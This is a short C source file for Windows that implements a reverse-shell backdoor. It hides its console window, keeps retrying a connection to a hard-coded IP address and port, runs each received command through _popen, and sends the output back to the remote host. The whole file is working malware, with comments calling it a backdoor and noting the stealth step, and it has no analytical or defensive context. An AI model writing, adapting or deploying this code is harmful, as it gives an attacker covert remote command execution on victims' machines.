#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <windowsx.h>
#include <wininet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>

#define bzero(param, size) (void) memset((param),0, size)

int sock;

void Shell();



int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrev , LPSTR lpCmdLine, int nCmdShow){
	// Steath of the command line
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);

	ShowWindow(stealth, 0);

	// Backdoor connection
	struct sockaddr_in ServAddr;
	unsigned short server_port;
	char* server_ip;

	WSADATA wsaData;
	server_ip = "192.168.17.129";
	server_port = 50005;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
	{
		exit(1);
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr,0, sizeof(ServAddr)); 
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr =  inet_addr(server_ip);
	ServAddr.sin_port = htons(server_port);


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	
	Shell();
}


void Shell() {
	 char buffer[1024]; char container[1024]; char total_response[18384];


	while (1) {
		 jmp:
		 bzero(buffer,1024);
		 bzero(container, sizeof(container));
		 bzero(total_response, sizeof(total_response));
		 recv(sock, buffer, 1024, 0);
	
		if(strncmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r");
			while (fgets(container,1024,fp) != NULL)
			{
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}
